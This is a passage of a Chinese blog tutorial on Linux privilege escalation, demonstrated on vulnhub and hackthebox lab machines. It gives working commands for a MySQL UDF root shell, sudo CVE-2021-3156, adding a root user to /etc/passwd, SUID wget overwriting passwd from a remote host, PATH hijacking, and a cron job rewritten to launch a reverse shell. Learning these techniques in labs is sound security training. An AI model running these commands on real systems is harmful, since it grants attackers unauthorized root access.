+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -g -shared -Wl,-soname,1518.so -o 1518.so 1518.c -lc</span><br></pre></td></tr></table></figure>
+
+<p>  登录<code>mysql</code>服务</p>
+<p>  <code>需要注意mysql的root跟linux的root是两回事</code></p>
+<p><img src="https://s2.loli.net/2022/02/12/81V3aeEfyoLGCSn.png" alt="image-20220211040726564"></p>
+<p>  登录<code>mysql</code>后执行下面命令</p>
+<p>  命令意思分别是:</p>
+<ul>
+<li>选择<code>mysql</code>库</li>
+<li>创建<code>foo</code>表,添加<code>blob</code>行</li>
+<li>加载<code>/tmp/1518.so</code>文件</li>
+<li>转储文件到<code>/usr/lib/mysql/plugin/1518.so</code></li>
+<li>创建<code>do_system</code>函数，调用<code>do_system</code>函数运行命令</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use mysql;</span><br><span class="line">create table foo(line blob);</span><br><span class="line">insert into foo values(load_file(&#x27;/tmp/1518.so&#x27;));</span><br><span class="line">select * from foo into dumpfile &#x27;/usr/lib/mysql/plugin/1518.so&#x27;;</span><br><span class="line">create function do_system returns integer soname &#x27;1518.so&#x27;; select do_system(&#x27;cp /bin/bash /tmp/stef; chmod +xs /tmp/stef&#x27;);</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2022/02/12/i1wCODXjslkn6UP.png" alt="image-20220211041202573"></p>
+<p>  运行创建的命令就可以获取<code>root</code>权限</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">/tmp/stef -p</span><br><span class="line"></span><br><span class="line">michael@Raven:/tmp$  /tmp/stef -p</span><br><span class="line">stef-4.3<span class="comment"># whoami</span></span><br><span class="line">root</span><br><span class="line">stef-4.3<span class="comment"># </span></span><br></pre></td></tr></table></figure>
+
+
+
+<p><strong>参考链接</strong></p>
+<p>  <a target="_blank" rel="noopener" href="https://www.hackingarticles.in/hack-the-raven-walkthrough-ctf-challenge/">https://www.hackingarticles.in/hack-the-raven-walkthrough-ctf-challenge/</a></p>
+<p>  <a target="_blank" rel="noopener" href="https://steflan-security.com/linux-privilege-escalation-exploiting-user-defined-functions/">https://steflan-security.com/linux-privilege-escalation-exploiting-user-defined-functions/</a></p>
+<h2 id="0x06-组件服务"><a href="#0x06-组件服务" class="headerlink" title="0x06 组件服务"></a>0x06 组件服务</h2><p>  组件服务提权包含一些系统自带的软件和用户自行安装的软件都在其中。</p>
+<p>  我采用<code>sudo(CVE-2021-3156)</code>漏洞进行演示</p>
+<p><strong>演示</strong></p>
+<p>  <strong>环境:<code>vulnhub-devguru</code></strong></p>
+<p>  使用脚本获取<code>Linux</code>软件版本</p>
+<p><img src="https://s2.loli.net/2022/02/12/CB6NzgVlKaxE2PY.png" alt="image-20220211181557488"></p>
+<p>  使用<code>Google</code>或<code>exploit-db</code>查询相关版本漏洞</p>
+<p><img src="https://s2.loli.net/2022/02/12/WMyeDfKQzlcZXO3.png" alt="image-20220211181658911"></p>
+<p>  将获取的脚本上传到<code>目标</code></p>
+<p>  运行脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python exploit_nss.py</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2022/02/12/ynYRoMCi2gH83E9.png" alt="image-20220211181814247"></p>
+<p>  当然不是所有组件漏洞都可以如此完美运行，提权的过程就如同人生充满了意外。</p>
+<h2 id="0x7-弱-重复-明文密码"><a href="#0x7-弱-重复-明文密码" class="headerlink" title="0x7 弱/重复/明文密码"></a>0x7 弱/重复/明文密码</h2><p>  如果进入服务时，我们拥有一个或多个密码，可以先尝试这些密码能否帮助我们获取更高权限。</p>
+<p>  如果不能，那我们可以检测连接数据库的文件(<code>config.php</code>或类似文件)。或者检查<code>dockerfile</code>等文件脚本。</p>
+<p><strong>演示</strong></p>
+<p>  <strong>环境:<code>hackthebox-Unbalanced</code></strong></p>
+<p>  使用<code>linpeas.sh</code>搜索服务敏感信息</p>
+<p>  看到<code>root</code>文件下的<code>sh</code>，但是我们有查看的权限</p>
+<p><img src="https://s2.loli.net/2022/02/12/sOaDy6iR1zmPfG7.png" alt="image-20220211191515488"></p>
+<p>  查看<code>/root/pihole_config.sh</code></p>
+<p><img src="https://s2.loli.net/2022/02/12/wJkIKlBMnV5EQCT.png" alt="image-20220211191639343"></p>
+<p>  尝试密码是否能使用</p>
+<p><img src="https://s2.loli.net/2022/02/12/qfbatBdRrD29Ihm.png" alt="image-20220211191832280"></p>
+<p><strong>参考链接</strong></p>
+<p>  <a target="_blank" rel="noopener" href="https://y4th0ts.medium.com/unbalanced-hackthebox-c8d086b6f524">https://y4th0ts.medium.com/unbalanced-hackthebox-c8d086b6f524</a></p>
+<h2 id="0x8-配置错误"><a href="#0x8-配置错误" class="headerlink" title="0x8 配置错误"></a>0x8 配置错误</h2><p>  <code>Linux</code>中提权所利用的配置错误，很多时候都是利用权限配置错误。比如<code>/etc/passwd</code>文件权限配置错误，给普通用户拥有对其文件写入的权限。或者普通用户拥有对<code>/etc/shadow</code>文件读取权限等。</p>
+<p><strong>演示</strong></p>
+<p>  <strong>环境:<code>ubuntu 16</code></strong></p>
+<p>  查看<code>/etc/passwd</code>权限配置</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -la /etc/passwd</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://s2.loli.net/2022/02/12/vSFD2zsPHRGhn3w.png" alt="image-20220212004652327"></p>
+<p>  当前用户拥有对<code>passwd</code>文件的<code>rwx</code>权限，直接添加用户到<code>passwd</code>即可提权。</p>
+<p>  使用<code>openssl</code>创建密码，有时候<code>linux</code>系统禁止空密码登录，因此我们最好是创建拥有密码的用户。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">test</span>@ubuntu:/tmp$ openssl passwd -1 -salt user passwd123</span><br><span class="line">$1$user<span class="variable">$TTjQ5OzFhMNL</span>/GYeI9xq9.</span><br></pre></td></tr></table></figure>
+
+<p>  写入<code>/etc/passwd</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;user:$1$user<span class="variable">$TTjQ5OzFhMNL</span>/GYeI9xq9.:0:0:root:/root:/bin/bash&quot;</span> &gt;&gt; /etc/passwd</span><br></pre></td></tr></table></figure>
+
+<p>  我们登录<code>user</code>用户就会切换到<code>root</code>权限</p>
+<p><img src="https://s2.loli.net/2022/02/12/gIToamWPD1O2tzk.png" alt="image-20220212005433098"></p>
+<h2 id="0x9-滥用sudo权限"><a href="#0x9-滥用sudo权限" class="headerlink" title="0x9 滥用sudo权限"></a>0x9 滥用sudo权限</h2><p>  <code>sudo</code>是一个类<code>unix</code>系统软件，它使用户能够以其他用户的安全权限运行程序，默认情况下是<code>root</code>权限。<code>sudo</code>提权在<code>ctf</code>环境中也是经常出现，不过现实实际情况比较小。</p>
+<p><strong>演示</strong></p>
+<p>  <strong>环境:<code>vulnhub-devguru</code></strong></p>
+<p>  <code>sudo -l</code>查看<code>sudo</code>是否存在滥用行为</p>
+<p><img src="https://s2.loli.net/2022/02/12/4kDY5rCV3jJvUfS.png" alt="image-20220212010842100"></p>
+<p>  <code>sqlite3</code>无需密码即可调用<code>root</code>权限</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -u<span class="comment">#-1 sqlite3 /dev/null &#x27;.shell /bin/bash&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2022/02/12/K6Jk8oucISbyxUZ.png" alt="image-20220212011006346"></p>
+<h2 id="0x10-suid-sgid-可执行文件"><a href="#0x10-suid-sgid-可执行文件" class="headerlink" title="0x10 suid/sgid 可执行文件"></a>0x10 suid/sgid 可执行文件</h2><p>  <code>SUID(set user ID)</code>和<code>SGID(set group ID)</code>是可以对可执行文件设置的两个特殊权限，这些权限允许正在执行的文件以所有者或组的权限执行。<code>suid</code>和<code>sgid</code>标志只对可执行二进制文件有影响，对脚本(如：<code>bash</code>、<code>python</code>、<code>perl</code>)是没有影响。</p>
+<ul>
+<li><code>suid</code>: 可执行文件的特殊文件权限。这使其用户都能够执行该文件。包括非文件所有者(组)以外的人。是<code>s</code></li>
+<li><code>sgid</code>: 这也是可执行文件的特殊权限，不同的是其他用户可以继承组所有者的有效<code>gid</code>。</li>
+</ul>
+<p><strong>演示</strong></p>
+<p>  <strong>环境:<code>vulnhub-HaWordy</code></strong></p>
+<p>  枚举可执行的二进制文件</p>
+  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2022/02/12/mvqSbKEjeupCF9n.png" alt="image-20220212025631882"></p>
+<p>  这么多二进制文件，如果想知道哪些是可以利用提权。这就需要<code>google</code>以及经验了，或者使用一些脚本来获取可利用的二进制文件。</p>
+<p>  根据查询结果发现<code>wget、cp</code>都是可以利用来提权的</p>
+<p>  查看<code>/etc/passwd</code>文件信息，把文件信息都复制到<code>kali</code>上</p>
+<p>  使用<code>openssl</code>创建用户，加到<code>passwd</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">test</span>@ubuntu:/tmp$ openssl passwd -1 -salt user passwd123</span><br><span class="line">$1$user<span class="variable">$TTjQ5OzFhMNL</span>/GYeI9xq9.</span><br></pre></td></tr></table></figure>
+
+<p>  <img src="https://s2.loli.net/2022/02/12/6QTi2Jvre1DBxd7.png" alt="image-20220212031658372"></p>
+<p>  使用<code>wget</code>远程下载<code>password</code>到<code>/etc</code>上</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://10.10.10.10/passwd -O /etc/passwd</span><br></pre></td></tr></table></figure>
+
+<p>  使用<code>user</code>就可以变成<code>root</code>权限</p>
+<p><img src="https://s2.loli.net/2022/02/12/5eyX76wYNxIfcs9.png" alt="image-20220212031759748"></p>
+<h2 id="0x11-root运行但普通用户可写的脚本"><a href="#0x11-root运行但普通用户可写的脚本" class="headerlink" title="0x11 root运行但普通用户可写的脚本"></a>0x11 root运行但普通用户可写的脚本</h2><p>  标题写的很明白，好像没什么可说的…</p>
+<p><strong>演示</strong></p>
+<p>  <strong>环境:<code>vulnhub-SkyDogCTF</code></strong></p>
+<p>  使用命令快速搜索可写的文件</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -writable -user root -<span class="built_in">type</span> f  2&gt;/dev/null &gt;&gt;/tmp/find</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2022/02/12/8RGnEHk6Ndc1MCr.png" alt="image-20220212035240730"></p>
+<p>  <code>/lib/log/sanitizer.py</code>属于<code>root</code>权限，但是普通用户可写。至于其他权限还需要去查看</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wernerbrandes@skydogctf:/tmp$ ls -la /lib/<span class="built_in">log</span>/sanitizer.py</span><br><span class="line">-rwxrwxrwx 1 root root 96 Oct 27  2015 /lib/<span class="built_in">log</span>/sanitizer.py</span><br></pre></td></tr></table></figure>
+
+<p>  我们拥有<code>sanitizer.py</code>的<code>rwx</code>权限，现在要利用<code>sanitizer.py</code>进行提权</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/usr/bin/env python</span></span><br><span class="line">import os</span><br><span class="line">import sys</span><br><span class="line">try:</span><br><span class="line">        os.system(<span class="string">&#x27;chmod u+s /bin/sh&#x27;</span>)</span><br><span class="line">except:</span><br><span class="line">        sys.exit()</span><br></pre></td></tr></table></figure>
+
+<p>  运行脚本</p>
+<p><img src="https://s2.loli.net/2022/02/12/wkQfjaJKBhOC2u4.png" alt="image-20220212035809340"></p>
+<h2 id="0x12-PATH提权"><a href="#0x12-PATH提权" class="headerlink" title="0x12 PATH提权"></a>0x12 PATH提权</h2><p>  <code>路径提权</code>是一个经典的提权方式，在各种<code>ctf</code>环境你会经常遇到这种类型的提权。</p>
+<p><strong>演示</strong></p>
+<p>  <strong>环境:<code>vulnhub-nullbyte</code></strong></p>
+<p>  寻找可利用的二进制文件</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2022/02/12/1wpAdbSD9VW8IF7.png" alt="image-20220212045809039"></p>
+<p>  <code>/var/www/backup/procwatch</code>比较像是备份使用的文件，运行看下</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ramses@NullByte:~$ /var/www/backup/procwatch</span><br><span class="line">  PID TTY          TIME CMD</span><br><span class="line"> 1353 pts/0    00:00:00 procwatch</span><br><span class="line"> 1354 pts/0    00:00:00 sh</span><br><span class="line"> 1355 pts/0    00:00:00 ps</span><br></pre></td></tr></table></figure>
+
+<p>  只是执行<code>ps</code>命令，没事。使用<code>$PATH</code>可以获取<code>procwatch</code>脚本的权限</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;/bin/sh&quot;</span> &gt; ps</span><br><span class="line">chmod 777 ps</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$PATH</span></span><br><span class="line"><span class="built_in">export</span> PATH=/tmp:<span class="variable">$PATH</span></span><br></pre></td></tr></table></figure>
+
+<p>  重新执行<code>/var/www/backup/procwatch</code></p>
+<p><img src="https://s2.loli.net/2022/02/12/HIo4kWSVXCOhLGa.png" alt="image-20220212045729957"></p>
+<h2 id="0x13-定时任务"><a href="#0x13-定时任务" class="headerlink" title="0x13 定时任务"></a>0x13 定时任务</h2><p>  <code>Linux</code>定时任务称为<code>crontab</code>，用来以固定时间、日期或间隔定时运行任务。</p>
+<p><strong>演示</strong></p>
+<p>  <strong>环境:<code>vulnhub-sar</code></strong></p>
+<p>  查看定时任务</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/crontab</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2022/02/12/mlhcBzrt6bo3aVY.png" alt="image-20220212052649392"></p>
+<p>  <code>finally.sh</code>会每隔<code>5</code>分钟运行一次</p>
+<p>  现在我们查看一下<code>finally.sh</code>脚本内容</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$cat</span> /var/www/html/./finally.sh</span><br><span class="line"><span class="comment">#!/bin/sh</span></span><br><span class="line"></span><br><span class="line">./write.sh</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>  <code>finally.sh</code>调用<code>write.sh</code>，有点像套娃</p>
+<p>  查看<code>write.sh</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$cat</span> write.sh</span><br><span class="line"><span class="comment">#!/bin/sh</span></span><br><span class="line"></span><br><span class="line">touch /tmp/gateway</span><br></pre></td></tr></table></figure>
+
+<p>  创建一个<code>gateway</code>文件就结束了</p>
+<p>  查看两个脚本的权限</p>
+<p><img src="https://s2.loli.net/2022/02/12/kRGCP1c59Uq6hx2.png" alt="image-20220212053118449"></p>
+<p>  <code>finally.sh</code>我们无法修改，但是<code>write.sh</code>可以修改</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;php ./php-reverse-shell.php&quot;</span> &gt; write.sh</span><br></pre></td></tr></table></figure>
+
+<p>  这时候<code>kali</code>开启<code>nc</code>等待<code>5分钟</code>就可以获取<code>shell</code></p>
+<p><img src="https://s2.loli.net/2022/02/12/TajsMNAb7zd8Cl3.png" alt="image-20220212054632467"></p>
+<h2 id="0x14-nfs"><a href="#0x14-nfs" class="headerlink" title="0x14 nfs"></a>0x14 nfs</h2><p>  <code>网络文件共享(NFS)</code>是一种协议，允许他人通过网络与其他<code>linux</code>客户端共享文件，同时还需要其他人对文件进行权限修改。</p>
+<p><strong>演示</strong></p>
+<p>  <strong>靶场:<code>vulnhub-0rcus</code></strong></p>
+<p>  查看端口开放</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -tunlp</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2022/02/12/GR6CTA9Dg7xEifL.png" alt="image-20220212071854427"></p>
+<p>  目标开放了很多端口，其中就包括<code>nfs</code>使用的<code>2049</code>端口</p>
+<p>  创建<code>test.c</code></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">  setresuid(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">  system(<span class="string">&quot;/bin/bash&quot;</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>  上传<code>test.c</code>到目标，然后使用<code>gcc</code>在<strong>目标服务器上编译</strong></p>
+<p><img src="https://s2.loli.net/2022/02/12/PyVbTw8sFjJXiBt.png" alt="image-20220212070839112"></p>
+<p>  在<code>kali</code>上挂载<code>nfs</code>，如果没安装<code>nfs-common</code>是无法挂载</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mount -t nfs 10.10.10.10:/tmp /tmp</span><br><span class="line">sudo chown root:root t</span><br><span class="line">sudo chmod u+s t</span><br></pre></td></tr></table></figure>
+
+<p>  回到目标服务器</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /tmp</span><br><span class="line">./t</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2022/02/12/NrKS7inZzveCd3q.png" alt="image-20220212071307197"></p>
+<h2 id="0x15-工具"><a href="#0x15-工具" class="headerlink" title="0x15 工具"></a>0x15 工具</h2><p>  利用工具进行辅助提权，会让我们干活事半功倍。但是如果仔细介绍工具感觉又可以水一篇文章，所以我会简单的一句话概况。</p>
+<h3 id="1-LinPEAS"><a href="#1-LinPEAS" class="headerlink" title="1.LinPEAS"></a>1.LinPEAS</h3><p>  <code>linpeas</code>是一个不错寻找敏感(<code>password</code>)信息的提权脚本</p>
+<p>  <a target="_blank" rel="noopener" href="https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS">https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS</a></p>
+<h3 id="2-LinEnum"><a href="#2-LinEnum" class="headerlink" title="2.LinEnum"></a>2.LinEnum</h3><p>  <code>LinEnum</code>会服务器内基本提权需要的信息都会枚举出来</p>
+<p>  <a target="_blank" rel="noopener" href="https://github.com/rebootuser/LinEnum">https://github.com/rebootuser/LinEnum</a></p>
+<h3 id="3-linux-exploit-suggester"><a href="#3-linux-exploit-suggester" class="headerlink" title="3.linux-exploit-suggester"></a>3.linux-exploit-suggester</h3><p>  <code>linux-exploit-suggester</code>根据软件版本进行<code>cve</code>漏洞判断，就像一些厂商扫描器判断漏洞那样子。你懂得~</p>
+<h2 id="结言"><a href="#结言" class="headerlink" title="结言"></a>结言</h2><p>  上面的提权演示由相当一部分是属于重复类型。比如<code>root</code>权限运行的<code>mysql</code>就属于<code>组件服务</code>和<code>root权限运行程序</code>的提权方式。不过没关系，上面这些演示是为了更了解<code>linux</code>提权方式。</p>
+<p>  推荐一下<code>vulnhub</code>靶机提权练习，如果想自己练习提权可以点击链接自己寻找。</p>
+<p>  <a target="_blank" rel="noopener" href="https://github.com/Ignitetechnologies/Privilege-Escalation">Privilege-Escalation</a></p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/projects_url">项目</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Linux-%E6%8F%90%E6%9D%83%E6%9D%82%E8%AE%B0"><span class="toc-number">1.</span> <span class="toc-text">Linux 提权杂记</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x1-%E5%89%8D%E8%A8%80"><span class="toc-number">1.1.</span> <span class="toc-text">0x1 前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x2-%E4%BB%80%E4%B9%88%E6%98%AF%E6%8F%90%E6%9D%83%EF%BC%9F"><span class="toc-number">1.2.</span> <span class="toc-text">0x2 什么是提权？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x3-Linux%E6%9D%83%E9%99%90%E5%88%92%E5%88%86"><span class="toc-number">1.3.</span> <span class="toc-text">0x3 Linux权限划分</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E6%9D%83%E9%99%90%E6%8A%BD%E8%B1%A1"><span class="toc-number">1.3.1.</span> <span class="toc-text">1.权限抽象</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-%E5%86%85%E6%A0%B8%E5%88%A9%E7%94%A8"><span class="toc-number">1.4.</span> <span class="toc-text">0x04 内核利用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05-root%E6%9D%83%E9%99%90%E8%BF%90%E8%A1%8C%E7%A8%8B%E5%BA%8F"><span class="toc-number">1.5.</span> <span class="toc-text">0x05 root权限运行程序</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x06-%E7%BB%84%E4%BB%B6%E6%9C%8D%E5%8A%A1"><span class="toc-number">1.6.</span> <span class="toc-text">0x06 组件服务</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x7-%E5%BC%B1-%E9%87%8D%E5%A4%8D-%E6%98%8E%E6%96%87%E5%AF%86%E7%A0%81"><span class="toc-number">1.7.</span> <span class="toc-text">0x7 弱&#x2F;重复&#x2F;明文密码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x8-%E9%85%8D%E7%BD%AE%E9%94%99%E8%AF%AF"><span class="toc-number">1.8.</span> <span class="toc-text">0x8 配置错误</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x9-%E6%BB%A5%E7%94%A8sudo%E6%9D%83%E9%99%90"><span class="toc-number">1.9.</span> <span class="toc-text">0x9 滥用sudo权限</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x10-suid-sgid-%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6"><span class="toc-number">1.10.</span> <span class="toc-text">0x10 suid&#x2F;sgid 可执行文件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x11-root%E8%BF%90%E8%A1%8C%E4%BD%86%E6%99%AE%E9%80%9A%E7%94%A8%E6%88%B7%E5%8F%AF%E5%86%99%E7%9A%84%E8%84%9A%E6%9C%AC"><span class="toc-number">1.11.</span> <span class="toc-text">0x11 root运行但普通用户可写的脚本</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x12-PATH%E6%8F%90%E6%9D%83"><span class="toc-number">1.12.</span> <span class="toc-text">0x12 PATH提权</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x13-%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1"><span class="toc-number">1.13.</span> <span class="toc-text">0x13 定时任务</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x14-nfs"><span class="toc-number">1.14.</span> <span class="toc-text">0x14 nfs</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x15-%E5%B7%A5%E5%85%B7"><span class="toc-number">1.15.</span> <span class="toc-text">0x15 工具</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-LinPEAS"><span class="toc-number">1.15.1.</span> <span class="toc-text">1.LinPEAS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-LinEnum"><span class="toc-number">1.15.2.</span> <span class="toc-text">2.LinEnum</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-linux-exploit-suggester"><span class="toc-number">1.15.3.</span> <span class="toc-text">3.linux-exploit-suggester</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%93%E8%A8%80"><span class="toc-number">1.16.</span> <span class="toc-text">结言</span></a></li></ol></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2022/02/12/Linux-%E6%8F%90%E6%9D%83%E6%9D%82%E8%AE%B0/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2022/02/12/Linux-%E6%8F%90%E6%9D%83%E6%9D%82%E8%AE%B0/&text=Linux 提权杂记"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2022/02/12/Linux-%E6%8F%90%E6%9D%83%E6%9D%82%E8%AE%B0/&title=Linux 提权杂记"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2022/02/12/Linux-%E6%8F%90%E6%9D%83%E6%9D%82%E8%AE%B0/&is_video=false&description=Linux 提权杂记"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Linux 提权杂记&body=Check out this article: http://example.com/2022/02/12/Linux-%E6%8F%90%E6%9D%83%E6%9D%82%E8%AE%B0/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2022/02/12/Linux-%E6%8F%90%E6%9D%83%E6%9D%82%E8%AE%B0/&title=Linux 提权杂记"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2022/02/12/Linux-%E6%8F%90%E6%9D%83%E6%9D%82%E8%AE%B0/&title=Linux 提权杂记"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2022/02/12/Linux-%E6%8F%90%E6%9D%83%E6%9D%82%E8%AE%B0/&title=Linux 提权杂记"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2022/02/12/Linux-%E6%8F%90%E6%9D%83%E6%9D%82%E8%AE%B0/&title=Linux 提权杂记"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2022/02/12/Linux-%E6%8F%90%E6%9D%83%E6%9D%82%E8%AE%B0/&name=Linux 提权杂记&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
